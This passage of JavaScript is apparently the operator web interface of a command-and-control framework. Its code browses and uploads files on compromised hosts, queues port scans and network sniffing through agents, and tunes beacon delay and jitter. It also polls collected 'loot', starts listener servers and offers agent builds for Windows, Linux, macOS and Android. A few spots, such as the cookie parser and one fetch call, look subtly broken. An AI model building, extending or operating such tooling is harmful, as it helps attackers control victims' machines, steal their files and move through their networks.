            function clamp(val, min, max) {
                return Math.max(min, Math.min(val, max));
            }

            function getDialogRect() {
                return dialog.getBoundingClientRect();
            }

            function onMove(e) {
                if (!isDragging) return;
                let clientX = e.touches ? e.touches[0].clientX : e.clientX;
                let clientY = e.touches ? e.touches[0].clientY : e.clientY;
                let newLeft = clientX - offsetX;
                let newTop = clientY - offsetY;
                // 限制窗口不移出页面
                const rect = getDialogRect();
                const winW = window.innerWidth, winH = window.innerHeight;
                const maxLeft = winW - rect.width;
                const maxTop = winH - rect.height;
                newLeft = clamp(newLeft, 0, maxLeft > 0 ? maxLeft : 0);
                newTop = clamp(newTop, 0, maxTop > 0 ? maxTop : 0);
                dialog.style.left = newLeft + "px";
                dialog.style.top = newTop + "px";
                dialog.style.transform = ""; // 拖动后取消居中
            }

            function stopMove() {
                isDragging = false;
                document.body.style.userSelect = "";
                document.removeEventListener("mousemove", onMove);
                document.removeEventListener("mouseup", stopMove);
                document.removeEventListener("touchmove", onMove);
                document.removeEventListener("touchend", stopMove);
            }

            dragBar.addEventListener("mousedown", function(e) {
                isDragging = true;
                const rect = getDialogRect();
                offsetX = e.clientX - rect.left;
                offsetY = e.clientY - rect.top;
                document.body.style.userSelect = "none";
                document.addEventListener("mousemove", onMove);
                document.addEventListener("mouseup", stopMove);
            });
            dragBar.addEventListener("touchstart", function(e) {
                isDragging = true;
                const rect = getDialogRect();
                offsetX = e.touches[0].clientX - rect.left;
                offsetY = e.touches[0].clientY - rect.top;
                document.body.style.userSelect = "none";
                document.addEventListener("touchmove", onMove, {passive: false});
                document.addEventListener("touchend", stopMove);
            });

            // 样式（内容后 append，避免被 innerHTML 覆盖）
            const style = document.createElement("style");
            style.textContent =
                ".dir-btn{margin:10px 0;cursor:pointer;color:#007bff;}" +
                ".dir-controls{margin:10px 0;display:flex;align-items:center;gap:8px;}" +
                ".fileinput{margin-left:8px;}" +
                ".directory,.file{padding:6px 0;border-bottom:1px solid #eee;display:flex;align-items:center;gap:8px;}" +
                ".icon-dir,.icon-file{margin-right:4px;}" +
                ".file-history{overflow:auto;background:#fafafa;border-right:1px solid #eee;}" +
                ".filecontainer{background:#fff;}" +
                ".file-manager{min-width:80px;}";
            dialog.appendChild(style);

            // 拖动改变 file-history 和 filecontainer 宽度（联动 file-manager）
            setTimeout(function () {
                const resizer = document.getElementById('file-history-resizer');
                const history = document.getElementById('history');
                const filecontainer = dialog.querySelector('.filecontainer');
                const parent = resizer.parentElement;
                let resizing = false, startX = 0, startWidth = 0, parentWidth = 0, resizerWidth = 0;

                resizer.addEventListener('mousedown', function(e) {
                    resizing = true;
                    startX = e.clientX;
                    startWidth = history.offsetWidth;
                    parentWidth = parent.offsetWidth;
                    resizerWidth = resizer.offsetWidth;
                    document.body.style.cursor = 'col-resize';
                    document.addEventListener('mousemove', resize);
                    document.addEventListener('mouseup', stopResize);
                });

                function resize(e) {
                    if (!resizing) return;
                    let newWidth = startWidth + (e.clientX - startX);
                    // 限制最小最大宽度
                    newWidth = Math.max(80, Math.min(newWidth, parentWidth - 80 - resizerWidth));
                    history.style.width = newWidth + 'px';
                    filecontainer.style.width = (parentWidth - newWidth - resizerWidth) + 'px';
                    filecontainer.style.flex = 'none';
                }

                function stopResize() {
                    resizing = false;
                    document.body.style.cursor = '';
                    document.removeEventListener('mousemove', resize);
                    document.removeEventListener('mouseup', stopResize);
                }
            }, 200);

            // 逻辑
            setTimeout(function () {
                const fliemanage = new lain_terminal();
                fliemanage.uid = uid;
                fliemanage.init();
                
                let hostname = document.getElementById("hostname");
                hostname.innerText = "Host:" + host;

                // 上传表单
                document.getElementById("uploadForm").addEventListener("submit", function(event) {
                    event.preventDefault();
                    var fileInput = document.getElementById("uploadFile");
                    var file = fileInput.files[0];
                    var splitSizeInput = document.getElementById("splitSize");
                    var splitSize = splitSizeInput.value ? parseFloat(splitSizeInput.value) * 1024 * 1024 : 0;
                    if (file) {
                        let file_name = fliemanage.shell_dir + "/" + file.name;
                        var fileSize = file.size;
                        var formData = new FormData();
                        formData.append("uploadFile", file);
                        formData.append("uid", fliemanage.uid);
                        formData.append("filename", file_name);
                        formData.append("splitSize", splitSize);
                        var xhr = new XMLHttpRequest();
                        xhr.open("POST", "/`+web_route+`?op=uploadFile", true);
                        xhr.onload = function() {
                            if (xhr.status === 200) {
                                console.log(file_name,"File uploaded successfully");
                                fliemanage.loadFile(file_name, fileSize);
                            } else {
                                alert("The file is being used");
                            }
                        };
                        xhr.send(formData);
                    } else {
                        alert("Please select a file");
                    }
                });

                // 返回上级目录
                document.getElementById("dir-btn").onclick = function() {
                    fliemanage.move_file(1, "no");
                };

                // 跳转目录
                document.getElementById("moveDirButton").onclick = function() {
                    fliemanage.move_dir();
                };

                // 初始化
                fliemanage.history_file();
                fliemanage.look_file("./");

                // 跳转无登录
                let username = fliemanage.username;
                if (!username) {
                    window.location.href = "about:blank";
                }
            }, 200);
        }
        showMsgDialog(uid, host) {
            // 检查是否已存在弹窗
            let dialog = document.getElementById("msg-dialog");
            if (!dialog) {
                dialog = document.createElement("div");
                dialog.id = "msg-dialog";
                dialog.style.position = "fixed";
                dialog.style.top = "10%";
                dialog.style.left = "50%";
                dialog.style.transform = "translateX(-50%)";
                dialog.style.background = "#fff";
                dialog.style.zIndex = 9999;
                dialog.style.maxWidth = "700px";
                dialog.style.width = "90vw";
                dialog.style.maxHeight = "90vh";
                dialog.style.overflow = "auto";
                dialog.style.border = "1px solid #ccc";
                dialog.style.borderRadius = "8px";
                dialog.style.boxShadow = "0 2px 8px rgba(0,0,0,0.2)";
                dialog.style.padding = "16px";
                dialog.style.userSelect = "none";
                dialog.style.touchAction = "none";
                document.body.appendChild(dialog);
            } else {
                dialog.innerHTML = "";
            }

            // 拖动条和内容
            dialog.innerHTML =
                '<div id="msg-drag-bar" style="position:absolute;top:0;left:0;width:100%;height:32px;cursor:move;background:rgba(0,0,0,0.05);border-top-left-radius:8px;border-top-right-radius:8px;z-index:10001;"></div>' +
                '<button id="msg-close-btn" type="button" style="position:absolute;right:10px;top:5px;z-index:10002;width:28px;height:28px;border-radius:50%;background:#f44336;color:#fff;border:none;display:flex;align-items:center;justify-content:center;font-size:18px;line-height:1;cursor:pointer;box-shadow:0 2px 6px rgba(0,0,0,0.08);transition:background 0.2s;" onmouseover="this.style.background=\'#d32f2f\'" onmouseout="this.style.background=\'#f44336\'">x</button>' +
                '<div style="display: flex; align-items: center; margin-top:32px;">' +
                    '<h2>Msg list</h2>' +
                    "<p id='hostname' style='margin-left: 25px;'>Host:" + host + "</p>" +
                '</div>' +
                '<div id="msg-container">loading...</div>';

            // 拖动逻辑（兼容PC和移动端，且窗口不能移出页面）
            const dragBar = dialog.querySelector("#msg-drag-bar");
            let isDragging = false, offsetX = 0, offsetY = 0;

            function clamp(val, min, max) {
                return Math.max(min, Math.min(val, max));
            }

            function getDialogRect() {
                return dialog.getBoundingClientRect();
            }

            function onMove(e) {
                if (!isDragging) return;
                let clientX = e.touches ? e.touches[0].clientX : e.clientX;
                let clientY = e.touches ? e.touches[0].clientY : e.clientY;
                let newLeft = clientX - offsetX;
                let newTop = clientY - offsetY;
                // 限制窗口不移出页面
                const rect = getDialogRect();
                const winW = window.innerWidth, winH = window.innerHeight;
                const maxLeft = winW - rect.width;
                const maxTop = winH - rect.height;
                newLeft = clamp(newLeft, 0, maxLeft > 0 ? maxLeft : 0);
                newTop = clamp(newTop, 0, maxTop > 0 ? maxTop : 0);
                dialog.style.left = newLeft + "px";
                dialog.style.top = newTop + "px";
                dialog.style.transform = ""; // 拖动后取消居中
            }

            function stopMove() {
                isDragging = false;
                document.body.style.userSelect = "";
                document.removeEventListener("mousemove", onMove);
                document.removeEventListener("mouseup", stopMove);
                document.removeEventListener("touchmove", onMove);
                document.removeEventListener("touchend", stopMove);
            }

            dragBar.addEventListener("mousedown", function(e) {
                isDragging = true;
                const rect = getDialogRect();
                offsetX = e.clientX - rect.left;
                offsetY = e.clientY - rect.top;
                document.body.style.userSelect = "none";
                document.addEventListener("mousemove", onMove);
                document.addEventListener("mouseup", stopMove);
            });
            dragBar.addEventListener("touchstart", function(e) {
                isDragging = true;
                const rect = getDialogRect();
                offsetX = e.touches[0].clientX - rect.left;
                offsetY = e.touches[0].clientY - rect.top;
                document.body.style.userSelect = "none";
                document.addEventListener("touchmove", onMove, {passive: false});
                document.addEventListener("touchend", stopMove);
            });

            // 关闭按钮
            dialog.querySelector("#msg-close-btn").onclick = function () {
                dialog.remove();
            };

            // 样式（内容后 append，避免被 innerHTML 覆盖）
            const style = document.createElement("style");
            style.textContent =
                ".msg-item {background: white; border: 1px solid #ccc; padding: 10px; margin-bottom: 8px; position: relative;}" +
                ".btn-group {position: absolute; right: 10px; top: 10px;}" +
                ".move-btn, .del-btn {margin-left: 5px; padding: 4px 6px; font-size: 14px;}" +
                ".msg-item span {user-select: none;}" +
                ".msg-item span[title] {color: blue; text-decoration: underline dotted;}";
            dialog.appendChild(style);

            // 逻辑
            setTimeout(function() {
                const msgContainer = dialog.querySelector("#msg-container");
                const server = window.location.protocol + "//" + window.location.host;

                function loadMessages() {
                    msgContainer.innerHTML = "";
                    fetch(server + "/`+web_route+`?op=getMsgList&uid=" + encodeURIComponent(uid))
                        .then(res => res.json())
                        .then(data1 => {
                            if (data1.messages && data1.messages.length > 0) {
                                data1.messages.forEach((msg, index) => {
                                    const msgElement = createMsgWithButtons(msg, index);
                                    msgContainer.appendChild(msgElement);
                                });
                            }
                            return fetch(server + "/`+web_route+`?op=getMsgPost&uid=" + encodeURIComponent(uid));
                        })
                        .then(response => response.json())
                        .then(data => {
                            if (data.messages && data.messages.length > 0) {
                                const postTitle = document.createElement("h2");
                                postTitle.textContent = "result List";
                                msgContainer.appendChild(postTitle);
                                data.messages.forEach((msg, index) => {
                                    const msgDiv = document.createElement("div");
                                    msgDiv.className = "msg-item";
                                    msgDiv.style.display = "flex";
                                    msgDiv.style.justifyContent = "space-between";
                                    msgDiv.style.alignItems = "center";
                                    msgDiv.style.gap = "8px";
                                    const shortText = msg.length > 10 ? msg.slice(0, 10) + "…" : msg;
                                    let expanded = false;
                                    const span = document.createElement("span");
                                    span.textContent = shortText;
                                    span.style.cursor = "pointer";
                                    span.onclick = () => { expanded = !expanded; span.textContent = expanded ? msg : shortText; };
                                    const btnGroup = document.createElement("div");
                                    btnGroup.style.display = "flex"; btnGroup.style.gap = "4px";
                                    const copyBtn = document.createElement("button");
                                    copyBtn.textContent = "📋"; copyBtn.className = "copy-btn"; copyBtn.title = "复制";
                                    copyBtn.onclick = () => { navigator.clipboard.writeText(msg).then(() => { copyBtn.textContent = "✅"; setTimeout(() => copyBtn.textContent = "📋", 1000); }).catch(console.error); };
                                    const delBtn = document.createElement("button");
                                    delBtn.textContent = "🗑"; delBtn.className = "del-btn"; delBtn.title = "删除";
                                    delBtn.onclick = () => {
                                        const idx = Array.from(msgDiv.parentElement.children).indexOf(msgDiv);
                                        var idx_ = idx > 0 ? idx - 1 : 0;
                                        const url = server + "/`+web_route+`?op=delMsgMap&uid=" + encodeURIComponent(uid) + "&index=" + idx_;
                                        fetch(url, { method: "GET" }).then(() => msgDiv.remove()).catch(console.error);
                                    };
                                    btnGroup.appendChild(copyBtn); btnGroup.appendChild(delBtn);
                                    msgDiv.appendChild(span); msgDiv.appendChild(btnGroup);
                                    msgContainer.appendChild(msgDiv);
                                });
                            }
                        })
                        .catch(error => { console.error("消息获取失败：", error); });
                }

                // 创建消息项（含按钮）
                function createMsgWithButtons(rawMsg, index) {
                    const parts = rawMsg.split("^");
                    let msgText = rawMsg;
                    if (parts[0] === "GET_U_FRIENDS") {
                        msgText = "scan:    " + parts[1] + "     range:    " + parts[2] + "     delay:     " + parts[3];
                    } else if (parts[0] === "GET_DELAY") {
                        msgText = "change delay:     " + parts[1] + "     seconds";
                    } else if (parts[0] === "GET_U_FILE") {
                        msgText = "File:     " + parts[1] + " Size:    " + parts[2] + "    bytes";
                    } else if (parts[0] === "LOAD_U_FILE") {
                        msgText = "File: " + parts[1];
                    } else if (parts[0] === "LOOK_UP_FILE") {
                        msgText = "lookDir:     " + parts[1];
                    } else if (parts[0] === "GET_PORTS") {
                        msgText = "sniff:     " + parts[1] + "     range:     " + parts[2] + "     delay:     " + parts[3];
                    } else if (parts[0] === "SWITCH_VERSION") {
                        msgText = "change shell:     " + parts[1];
                    }

                    const msgDiv = document.createElement("div");
                    msgDiv.className = "msg-item";

                    const idxStr = String(index).padStart(2, "0");
                    const indexLabel = document.createElement("span");
                    indexLabel.textContent = "[" + idxStr.slice(0, 10) + "] ";
                    msgDiv.appendChild(indexLabel);

                    msgDiv.appendChild(document.createTextNode(msgText));

                    const btnGroup = document.createElement("div");
                    btnGroup.className = "btn-group";

                    const upBtn = document.createElement("button");
                    upBtn.textContent = "⬆";
                    upBtn.className = "move-btn";
                    upBtn.onclick = () => moveUp(msgDiv);

                    const downBtn = document.createElement("button");
                    downBtn.textContent = "⬇";
                    downBtn.className = "move-btn";
                    downBtn.onclick = () => moveDown(msgDiv);

                    const delBtn = document.createElement("button");
                    delBtn.textContent = "🗑";
                    delBtn.className = "del-btn";
                    delBtn.onclick = () => deleteMsg(msgDiv);

                    btnGroup.appendChild(upBtn);
                    btnGroup.appendChild(downBtn);
                    btnGroup.appendChild(delBtn);

                    msgDiv.appendChild(btnGroup);
                    return msgDiv;
                }

                // 上移
                function moveUp(msgDiv) {
                    const prev = msgDiv.previousElementSibling;
                    if (!prev) return;

                    // 先发请求，再改 DOM
                    sendReorder(msgDiv, prev, "before")
                        .then(() => {
                            msgContainer.insertBefore(msgDiv, prev);
                        })
                        .catch(console.error);
                }

                // 下移
                function moveDown(msgDiv) {
                    const next = msgDiv.nextElementSibling;
                    if (!next) return;

                    // 先发请求，再改 DOM
                    sendReorder(msgDiv, next, "after")
                        .then(() => {
                            msgContainer.insertBefore(next, msgDiv);
                        })
                        .catch(console.error);
                }

                // 删除
                function deleteMsg(msgDiv) {
                    const idx = Array.from(msgContainer.children).indexOf(msgDiv);
                    if (idx < 0) return;

                    const url = server + "/`+web_route+`?op=delMsgGet&uid=" + encodeURIComponent(uid) + "&index=" + idx;
                    fetch(url, { method: "GET" })
                        .then(() => msgDiv.remove())
                        .catch(console.error);
                }

                // 发送 reorder 请求（支持 before / after）
                function sendReorder(sourceDiv, targetDiv, mode) {
                    const children = Array.from(msgContainer.children);
                    const s_id = children.indexOf(sourceDiv);
                    const t_id = children.indexOf(targetDiv);
                    if (s_id === -1 || t_id === -1) return Promise.reject("invalid dom index");
                    let pos;
                    if (mode === "before") {
                        pos = t_id;        // 插到 target 前面
                    } else {
                        pos = t_id + 1;    // 插到 target 后面
                    }
                    const url = server + "/`+web_route+`?op=changeMsh&uid=" + encodeURIComponent(uid) +
                                "&s_id=" + s_id + "&pos=" + pos;
                    return fetch(url, { method: "GET" })
                        .then(res => res.json())
                        .then(data => {
                            if (data.code !== 200) {
                                return Promise.reject(data.message || "reorder failed");
                            }
                            return data;
                        });
                }
                loadMessages();
                dialog._msgInterval = setInterval(loadMessages, 30000);
                // 弹窗关闭时清理定时器
                dialog.querySelector("#msg-close-btn").addEventListener("click", function() {
                    if (dialog._msgInterval) clearInterval(dialog._msgInterval);
                });
            }, 200);
        }
        saveInfo(uid) {
            const remarks = document.getElementById('remarks_' + uid).value;
            const delay = document.getElementById('delay_' + uid).value;
            const jitter = document.getElementById('jitter_' + uid).value;
            const username = document.getElementById('username_' + uid).value;
            fetch(this.server + "/`+web_route+`?op=change", {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    remarks: remarks,
                    delay: delay,
                    jitter: jitter,
                    username: username,
                    uid: uid,
                    taskid: TaskId
                })
            })
            .then(response => response.text())
            .then(data => {
                if (data === 'confirm') {
                    console.log("Changes saved!");
                    const userIndex = this.User_data.findIndex(client => client.uid === uid);
                    if (userIndex !== -1) {
                        this.User_data[userIndex].remarks = remarks;
                        this.User_data[userIndex].delay = delay;
                        this.User_data[userIndex].jitter = jitter;
                        this.User_data[userIndex].username = username;
                    }
                    this.updateUserUI(uid, remarks, delay, username, jitter);
                } else {
                    let new_user = document.getElementById('username_' + uid).value;
                    if(new_user){
                        let change_url = this.server + "/`+web_route+`?op=confirm&uid=" + uid + "&username=" + new_user;
                        fetch(change_url)
                            .then(response => response.json())
                            .then(clients => {
                                const userIndex = this.User_data.findIndex(client => client.uid === uid);
                                if (userIndex !== -1) {
                                    this.User_data[userIndex].remarks = remarks;
                                    this.User_data[userIndex].delay = delay;
                                    this.User_data[userIndex].username = username;
                                    this.User_data[userIndex].jitter = jitter;
                                }
                                this.updateUserUI(uid, remarks, delay, username, jitter);
                            });
                    }
                }
            })
            .catch(error => {
                console.error("Error saving changes:", error);
            });
        }
        updateUserUI(uid, remarks, delay, username, jitter) {
            document.getElementById('remarks_' + uid).value = remarks;
            document.getElementById('delay_' + uid).value = delay;
            document.getElementById('username_' + uid).value = username;
            document.getElementById('jitter_' + uid).value = jitter;
        }
        checkTime() {
            if (this.username) {
                let check_url = this.server + "/`+web_route+`?op=checkTime&username=" + this.username;
                setInterval(() => {
                    fetch(check_url)
                        .then(response => {
                            if (response.ok && response.headers.get('Content-Type').includes('application/json')) {
                                return response.json();
                            } else {
                                throw new Error("Invalid JSON response");
                            }
                        })
                        .then(data => {
                            this.check_time.forEach(item => {
                                let userDiv = document.getElementById(item.uid + "info");
                                if (userDiv) {
                                    let imgElement = document.getElementById(item.uid + "-img");
                                    let checkElement = document.getElementById(item.uid + "-check");
                                    if (imgElement) {
                                        if (item.checkTime !== data.find(i => i.uid === item.uid)?.checkTime) {
                                            imgElement.outerHTML = '<img class="ip-address" id="' + item.uid + '-img" src="rhythm.gif" style="width: 106px; height: 46px; display: inline-block; vertical-align: middle;"/>';
                                        } else {
                                            imgElement.outerHTML = '<div class="ip-address" id="' + item.uid + '-img" style="background-color: #8B4513; width: 106px; height: 1px; display: inline-block; vertical-align: middle; position: relative;"><div style="position: absolute; top: 0; left: 0; right: 0; bottom: 0; box-shadow: inset 0 0 0 106px #8B4513;"></div></div>';
                                        }
                                    }
                                    checkElement.innerText = item.checkTime;
                                }
                            });
                            console.log(this.check_time,data);
                            this.check_time = data;
                        })
                        .catch(error => {
                            console.error("Error fetching data:", error);
                        });
                }, 5000);
            }
        }
        del(shell) {
            let right = confirm('Confirm to remove?');
            if (right) {
                fetch(this.server + "/`+web_route+`?op=delInfo&uid=" + shell)
                    .then(response => response.text())
                    .then(data => {
                        alert(data);
                        this.User_data = this.User_data.filter(user => user.uid !== shell);
                        const userDiv = document.getElementById(shell + "info");
                        if (userDiv) {
                            userDiv.remove();  // 删除对应的 div 元素
                        }
                    })
                    .catch(error => console.error("Error:", error));
            }
        }
    async getloot() {
        const lootFileDiv = document.getElementById('g_file');
        // 每隔 5 秒自动发送请求
        setInterval(async () => {
            try {
                let response = await fetch(this.server+"/`+web_route+`?op=getFile&username=" + this.username);
                if (!response.ok) {
                    throw new Error("Failed to fetch loot");
                }
                let lootHTML = await response.text();
                lootFileDiv.innerHTML = lootHTML;  // 更新页面内容
            } catch (error) {
                console.error("Error fetching loot:", error);
            }
        }, 5000);  // 5000 毫秒 = 5 秒
    }
    
}
class lain_net{
    constructor(){
        this.server = window.location.protocol + "//" + window.location.host;
        this.username = this.getCookie("cookie");
        this.shell_list=[];
    }
    
    getCookie(name) {
        let cookies = document.cookie.split('; ');
        for (let i = 0; i < cookies.length; i++) {
            let cookie = cookies[i];
            let cookieParts = cookie.split('=');
            if (cookieParts[0] === name) {
                return cookieParts[2];
            }
        }
        return null;
    }
    
    async getNet() {
        // 定时发送请求
        try {
            setInterval(async () => {
                var uid = document.getElementById('net_shell').value;
                if (uid) {
                    await fetch(this.server + "/`+web_route+`?op=net_getresults&uid=" + uid);
                    let net_json = await fetch(this.server + "/`+web_route+`?op=getInnet&uid=" + uid);
                    let text = await net_json.text();
                    console.log("Response Text:", text);
                    let net_data;
                    try {
                        net_data = JSON.parse(text);
                    } catch (e) {
                        return;
                    }
                    let net = document.getElementById('net_div');
                    net.innerHTML = ''; 
                    net_data.forEach(item => {
                        let div = document.createElement('div');
                        div.classList.add("net_div_son");
                        div.style.display = 'flex'; 
                        div.style.justifyContent = 'space-between';
                        let contentDiv = document.createElement('div');
                        contentDiv.innerHTML = "<strong></strong>" + item.target + "<br>";
                        // 添加空值检查和数组类型检查
                        if (Array.isArray(item.shell_innet) && item.shell_innet.length > 0) {
                            let innetDiv = document.createElement('div');
                            let sanitizedText = item.shell_innet.join(',\n');
                            sanitizedText = sanitizedText.replace(/\{\{\{([^}]+)\}\}\}/g, function(match, content) {
                                let escapedContent = content.replace(/[\s\S]/g, function(char) {
                                    return '\\u' + ('0000' + char.charCodeAt(0).toString(16)).slice(-4);
                                });
                                // 返回替换后的内容，保持外面的大括号
                                return escapedContent;
                            });
                            sanitizedText = "<strong>" + sanitizedText + "</strong>";
                            innetDiv.innerHTML = sanitizedText;
                            contentDiv.appendChild(innetDiv);

                        }
                        div.appendChild(contentDiv);
                        let button = document.createElement('button');
                        button.onclick = () => this.del_net(item.target, uid);
                        button.textContent = 'remove';
                        button.style.marginLeft = 'auto';
                        div.appendChild(button);
                        net.appendChild(div);
                    });
                }
            }, 5000);
        } catch (error) {
            console.error('Error in getNet:', error);
        }
    }
    async scan(){
        var uid = document.getElementById('net_shell').value;
        let optionValue = document.getElementById('net_options').value; //选项
        let targetValue = document.getElementById('net_target').value; //目标
        let targetListValue = document.getElementById('net_target_list').value; //探测范围
        var sleepTimeValue = document.getElementById('net_sleep_time').value; //休眠时间
        let customSleepTimeValue = document.getElementById('custom_sleep_time').value; //自定义时间
        if (sleepTimeValue === 'custom') {
            sleepTimeValue = customSleepTimeValue;
        }
        console.log('Select:', optionValue);
        console.log('IP:', targetValue);
        console.log('Range:', targetListValue);
        console.log('Delay:', sleepTimeValue);
        
        if (isNaN(sleepTimeValue) || sleepTimeValue < 1) {
            sleepTimeValue = 1; // 默认最小值为1
        }

        if(optionValue === "scan"){
            var cmd="GET_PORTS^"+targetValue+"^"+targetListValue+"^"+sleepTimeValue+"^save";
        }else if(optionValue === "sniff"){
            var cmd="GET_U_FRIENDS^"+targetValue+"^"+targetListValue+"^"+sleepTimeValue+"^save";
        }
        await fetch(this.server+"/`+web_route+`?op=msg&uid="+uid+"&msg="+encodeURIComponent(cmd))+"&Taskid=scanTask";
    }
    del_net(target,uid){
        fetch(this.server+"/`+web_route+`?op=delShellInnet&uid="+uid+"&target="+target)
    }
    async getshellip(){
        var uid = document.getElementById('net_shell').value;
        let shell_ip_json = await fetch(this.server+"/`+web_route+`?op=getShellInnet&uid="+uid);
        let shell_ip_str = await shell_ip_json.text();  // 获取到的依然是字符串
        let shell_ip_list = shell_ip_str.split(',');  // 将逗号分隔的字符串转换为数组
        let have_ip_div = document.getElementById('have_ip');
        have_ip_div.innerHTML="";
        let cur_div = document.createElement('div');
        cur_div.textContent='Host net:';
        have_ip_div.appendChild(cur_div);
        shell_ip_list.forEach(item => {
            let div = document.createElement('div');
            div.innerHTML = "IP:"+item+"\t";  // 将每个IP显示在新的行中
            have_ip_div.appendChild(div);
        });
    }
}

class lain_server {
    constructor() {
        this.server = window.location.protocol + "//" + window.location.host;
        this.username = this.getCookie("cookie");
        this.server_data = [];
        this.server_pulgin = [];
    }
    getCookie(name) {
        let cookies = document.cookie.split('; ');
        for (let i = 0; i < cookies.length; i++) {
            let cookie = cookies[i];
            let cookieParts = cookie.split('=');
            if (cookieParts[0] === name) {
                return cookieParts[2];
            }
        }
        return null;
    }
    clear_memory(){
        fetch(this.server+'/`+web_route+`?op=cleanup')
    }
    async get_server_pulgin(port,codeWord,code,os,parameter) {
        const data = {
            port: port,
            codeWord: codeWord,
            code: code,
            os: os,
            parameter: parameter
        };
        this.server_pulgin.push(data);
        console.log("Plugin data added:", data);
        return data;
    }
    async start_server() {
        const form = document.getElementById("serverForm");

        // 使用 FormData 获取表单数据
        const formData = new FormData(form);
        const jsonData = {};

        // 处理证书和密钥的内容
        const certContent = formData.get("cert") || ""; // 获取证书内容，默认为空字符串
        const keyContent = formData.get("key") || ""; // 获取密钥内容，默认为空字符串

        // 将表单数据转换为 JSON 格式
        formData.forEach((value, key) => {
            if (key !== "cert" && key !== "key") {
                jsonData[key] = value;  // 其他字段直接添加
            }
        });

        console.log("Form data to be sent:", jsonData);

        // 添加证书和密钥到 jsonData
        jsonData.cert = certContent;
        jsonData.key = keyContent;

        try {
            const res = await fetch("/`+web_route+`?op=startServer", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                },
                body: JSON.stringify(jsonData),
            });
            if (!res.ok) {
                const errorText = await res.text();
                alert("HTTP error!: " + errorText);
            }
        } catch (err) {
        }
    }
    async get_server() {
        // 只绑定一次 click 事件
        this.initServerIndexClickHandler();

        setInterval(async () => {
            try {
                let interval_server = this.server + "/`+web_route+`?op=ServerIndex&clientsCount=" + this.server_data.length;
                const response = await fetch(interval_server);
                if (!response.ok && response.status === 400) {
                    const errorText = await response.text();
                    console.error('Error:', errorText);
                    return;
                }
                if (response.ok && response.headers.get('Content-Type')?.includes('application/json')) {
                    const data = await response.json();
                    if (data !== 'noNeeded' && Array.isArray(data) && data.length > 0) {
                        this.server_data = data;
                        this.updateServerIndex();
                    }
                }
            } catch (error) {
                console.error('Request failed', error);
            }
        }, 15000);
    }

    updateServerIndex() {
        const serverIndexDiv = document.getElementById('server_index');
        if (!serverIndexDiv) return;
        let htmlContent = "";
        for (const server of this.server_data) {
            const key_path = server.keyPath.length > 10 ? server.keyPath.substring(0, 10) + "..." : server.keyPath;
            const cert_path = server.certPath.length > 10 ? server.certPath.substring(0, 10) + "..." : server.certPath;
            htmlContent += "<div id='" + server.port + "-info' class='server-info' style='border:1px solid #ccc;padding:10px;margin-bottom:10px;border-radius:6px;background-color:#f9f9f9;'>";
                htmlContent += "<div class='server-container' style='margin-bottom:6px;font-family:monospace;color:#333;font-size:14px;'>";
                
                htmlContent += "<strong class='ip-address' style='color:#007BFF;'>port:</strong> <span style='margin-right:12px;'>" + server.port + "</span>";
            htmlContent += "<strong class='ip-address' style='color:#007BFF;'>protocol:</strong> <span style='margin-right:12px;'>" + server.protocol + "</span>";
            htmlContent += "<strong class='ip-address' style='color:#007BFF;'>cert:</strong> <span style='margin-right:12px;'>" + cert_path + "</span>";
            htmlContent += "<strong class='ip-address' style='color:#007BFF;'>key:</strong> <span style='margin-right:12px;'>" + key_path + "</span>";
            htmlContent += "<strong class='ip-address' style='color:#007BFF;'>user:</strong> <span style='margin-right:12px;'>" + server.user + "</span>";
            htmlContent += "<strong class='ip-address' style='color:#007BFF;'>path:</strong> <span style='margin-right:12px;'>" + server.path + "</span>";
            htmlContent += "<strong class='ip-address' style='color:#007BFF;'>remark:</strong> <span style='margin-right:12px;'>" + server.remark + "</span>";
            htmlContent += "<strong class='ip-address' style='color:#007BFF;'>agents:</strong> <span style='color:#DC3545; margin-right:12px;' id='" + server.port + "'>0</span>";

                htmlContent += "</div>";
                htmlContent += "<div style='display:flex;flex-wrap:wrap;gap:8px;'>";
                if (server.windows_pro === "group_pro") {
                    htmlContent += "<a class='ip-address agent-link' href='javascript:void(0)' data-os='win' data-port='" + server.port + "' style='text-decoration:none;padding:4px 8px;background:#f9f9f9;color:black;border-radius:4px;font-size:13px;'>{Win_agent}</a>";
                } else {
                    htmlContent += "<a class='ip-address agent-link' href='javascript:void(0)' data-os='win' data-port='" + server.port + "' style='text-decoration:none;padding:4px 8px;background:#f9f9f9;color:black;border-radius:4px;font-size:13px;'>{Win_agent}</a>";
                    htmlContent += "<a class='ip-address agent-link' href='javascript:void(0)' data-os='linux' data-port='" + server.port + "' style='text-decoration:none;padding:4px 8px;background:#f9f9f9;color:black;border-radius:4px;font-size:13px;'>{Linux_agent}</a>";
                    htmlContent += "<a class='ip-address agent-link' href='javascript:void(0)' data-os='macos' data-port='" + server.port + "' style='text-decoration:none;padding:4px 8px;background:#f9f9f9;color:black;border-radius:4px;font-size:13px;'>{MacOS_agent}</a>";
                    htmlContent += "<a class='ip-address agent-link' href='javascript:void(0)' data-os='android' data-port='" + server.port + "' style='text-decoration:none;padding:4px 8px;background:#f9f9f9;color:black;border-radius:4px;font-size:13px;'>{Android_agent}</a>";
                }
                htmlContent += "<a class='ip-address download-config' href='javascript:void(0)' data-port='" + server.port + "' style='text-decoration:none;padding:4px 8px;background:#f9f9f9;color:black;border-radius:4px;font-size:13px;'>{Download Config}</a>";
                htmlContent += "<a class='ip-address plugin' href='javascript:void(0)' data-port='" + server.port + "' style='text-decoration:none;padding:4px 8px;background:#f9f9f9;color:black;border-radius:4px;font-size:13px;'>{plugin}</a>";
                htmlContent += "<a class='ip-address delete-server' href='javascript:void(0)' data-port='" + server.port + "' style='text-decoration:none;padding:4px 8px;background:#f9f9f9;color:black;border-radius:4px;font-size:13px;'>{Delete}</a>";
                htmlContent += "</div>";
            htmlContent += "</div>";
        }
        serverIndexDiv.innerHTML = htmlContent;
    }

    initServerIndexClickHandler() {
        const serverIndexDiv = document.getElementById('server_index');
        if (!serverIndexDiv) return;

        serverIndexDiv.addEventListener('click', (event) => {
            const target = event.target;

            if (target.classList.contains('delete-server')) {
                const port = target.getAttribute('data-port');
                this.server_data = this.server_data.filter(s => s.port !== port);
                fetch(this.server + "/`+web_route+`?op=delserver&port=" + port)
                    .then(res => res.text())
                    .then(data => {
                        if (data === "[!] This server has agents,can not stop\n") {
                            alert(data);
                            return;
                        }
                        const serverDiv = document.getElementById(port + "-info");
                        if (serverDiv) serverDiv.remove();
                    });
            }

            if (target.classList.contains('download-config')) {
                const port = target.getAttribute('data-port');
                this.downloadConfig(port);
